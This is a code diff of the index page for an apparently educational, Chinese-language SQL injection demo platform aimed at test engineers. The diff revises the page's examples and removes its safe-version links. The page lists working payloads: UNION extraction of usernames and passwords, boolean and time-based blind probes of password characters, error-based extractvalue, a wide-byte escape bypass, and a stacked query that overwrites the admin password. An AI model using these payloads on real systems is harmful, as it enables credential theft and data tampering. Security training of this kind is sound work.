@@ -12,7 +12,7 @@
         .demo-card p { color: #666; }
         .demo-container { display: flex; flex-wrap: wrap; justify-content: space-between; }
         .demo-card { flex: 1 1 300px; min-width: 300px; }
-        .code-block { background-color: #f5f5f5; padding: 10px; border-radius: 4px; overflow-x: auto; }
+        .code-block { background-color: #f5f5f5; padding: 5px; border-radius: 4px; overflow-x: auto; }
         a { color: #3498db; text-decoration: none; }
         a:hover { text-decoration: underline; }
         .nav-bar { background-color: #2c3e50; color: white; padding: 10px 20px; border-radius: 8px; margin-bottom: 20px; }
@@ -20,80 +20,92 @@
     </style>
 </head>
 <body>
-    <div class="nav-bar">
-        <a href="/">首页</a>
-        <a href="/form_injection">表单注入</a>
+<div class="nav-bar">
+    <a href="/">首页</a>
+    <a href="/form_injection">表单注入</a>
+</div>
+
+<h1>SQL注入演示平台</h1>
+<p>本平台旨在帮助测试工程师学习和理解各种SQL注入攻击方式及其防护方法。</p>
+
+<div class="demo-container">
+    <div class="demo-card">
+        <h2>1. 联合查询注入</h2>
+        <p>通过构造包含UNION的查询，获取数据库中的额外信息。</p>
+        <p>获取users表的 username 和 password</p>
+        <div class="code-block">
+            <p>1 UNION SELECT 1,username,password FROM users--</p>
+        </div>
+        <a target="_blank" href="/union_injection/">联合查询注入</a>
     </div>
 
-    <h1>SQL注入演示平台</h1>
-    <p>本平台旨在帮助测试工程师学习和理解各种SQL注入攻击方式及其防护方法。</p>
-
-    <div class="demo-container">
-        <div class="demo-card">
-            <h2>1. 联合查询注入</h2>
-            <p>通过构造包含UNION的查询，获取数据库中的额外信息。</p>
-            <div class="code-block">
-                <p>不安全示例:</p>
-                <p>GET /union_injection/1%20UNION%20SELECT%201,username,password%20FROM%20users--</p>
-                <p>安全示例:</p>
-                <p>GET /union_injection_safe/1</p>
-            </div>
-            <a href="/union_injection/1">测试不安全版本</a> | 
-            <a href="/union_injection_safe/1">测试安全版本</a>
+    <div class="demo-card">
+        <h2>2. 布尔盲注</h2>
+        <p>通过构造布尔表达式，根据返回结果判断信息。</p>
+        <p>1.获得更多信息。</p>
+        <div class="code-block">
+            <p> admin' OR 1=1 </p>
         </div>
-
-        <div class="demo-card">
-            <h2>2. 布尔盲注</h2>
-            <p>通过构造布尔表达式，根据返回结果判断信息。</p>
-            <div class="code-block">
-                <p>GET /boolean_blind/ AND SUBSTRING(password,1,1)='a'</p>
-            </div>
-            <a href="/boolean_blind/ AND SUBSTRING(password,1,1)='a'">测试布尔盲注</a>
+        <p>2.尝试破解密码。</p>
+        <div class="code-block">
+            <p> admin' AND SUBSTRING(password,1,1)='a </p>
         </div>
-
-        <div class="demo-card">
-            <h2>3. 报错注入</h2>
-            <p>通过构造恶意查询，使数据库返回错误信息，从而获取敏感数据。</p>
-            <div class="code-block">
-                <p>GET /error_injection/ AND (SELECT 1/0)</p>
-                <p>GET /error_injection/ AND extractvalue(1,concat(0x5c,(SELECT user())))</p>
-            </div>
-            <a href="/error_injection/ AND (SELECT 1/0)">测试报错注入</a>
-        </div>
-
-        <div class="demo-card">
-            <h2>4. 时间盲注</h2>
-            <p>通过构造包含时间延迟函数的查询，根据响应时间判断信息。</p>
-            <div class="code-block">
-                <p>GET /time_blind/3</p>
-                <p>GET /time_blind/IF(SUBSTRING(password,1,1)='a',3,0)</p>
-            </div>
-            <a href="/time_blind/3">测试时间盲注</a>
-        </div>
-
-        <div class="demo-card">
-            <h2>5. 表单注入</h2>
-            <p>通过表单输入框注入SQL代码。</p>
-            <a href="/form_injection">测试表单注入</a>
-        </div>
-
-        <div class="demo-card">
-            <h2>6. 宽字节注入</h2>
-            <p>利用数据库编码特性，绕过转义机制。</p>
-            <div class="code-block">
-                <p>GET /wide_byte_injection/%df' OR '1'='1</p>
-            </div>
-            <a href="/wide_byte_injection/%df' OR '1'='1">测试宽字节注入</a>
-        </div>
-
-        <div class="demo-card">
-            <h2>7. 堆叠查询注入</h2>
-            <p>执行多个SQL查询，通常用于添加、修改或删除数据。</p>
-            <div class="code-block">
-                <p>GET /stacked_queries/UPDATE users SET password='hacked' WHERE username='admin'</p>
-            </div>
-            <a href="/stacked_queries/SELECT 1">测试堆叠查询</a>
-        </div>
+        <a target="_blank" href="/boolean_blind/">测试布尔盲注</a>
     </div>
+
+    <div class="demo-card">
+        <h2>3. 报错注入</h2>
+        <p>通过构造恶意查询，使数据库返回错误信息，从而获取敏感数据。</p>
+        <p>1. 1/0 除零错误（Division by zero）</p>
+        <div class="code-block">
+            <p> AND (SELECT 1/0)</p>
+        </div>
+        <p>2.
+            extractvalue(xml_frag, xpath_expr):
+            MySQL 函数，用于从 XML 文档中提取值。</br>
+            concat(0x5c, (SELECT user()))
+            concat()：字符串拼接函数; </br>
+            0x5c：十六进制，表示字符 \
+        </p>
+        <div class="code-block">
+            <p> AND extractvalue(1,concat(0x5c,(SELECT user())))</p>
+        </div>
+        <a target="_blank" href="/error_injection/">测试报错注入</a>
+    </div>
+
+    <div class="demo-card">
+        <h2>4. 时间盲注</h2>
+        <p>通过构造包含时间延迟函数的查询，根据响应时间判断信息。</p>
+        <div class="code-block">
+            <p>GET /time_blind/3</p>
+            <p>GET /time_blind/IF(SUBSTRING(password,1,1)='a',3,0)</p>
+        </div>
+        <a target="_blank" href="/time_blind/3">测试时间盲注</a>
+    </div>
+
+    <div class="demo-card">
+        <h2>5. 表单注入</h2>
+        <p>通过表单输入框注入SQL代码。</p>
+        <a target="_blank" href="/form_injection">测试表单注入</a>
+    </div>
+
+    <div class="demo-card">
+        <h2>6. 宽字节注入</h2>
+        <p>利用数据库编码特性，绕过转义机制。</p>
+        <div class="code-block">
+            <p>GET /wide_byte_injection/%df' OR '1'='1</p>
+        </div>
+        <a target="_blank" href="/wide_byte_injection/%df' OR '1'='1">测试宽字节注入</a>
+    </div>
+
+    <div class="demo-card">
+        <h2>7. 堆叠查询注入</h2>
+        <p>执行多个SQL查询，通常用于添加、修改或删除数据。</p>
+        <div class="code-block">
+            <p>GET /stacked_queries/UPDATE users SET password='hacked' WHERE username='admin'</p>
+        </div>
+        <a target="_blank" href="/stacked_queries/SELECT 1">测试堆叠查询</a>
+    </div>
+</div>
 </body>
 </html>
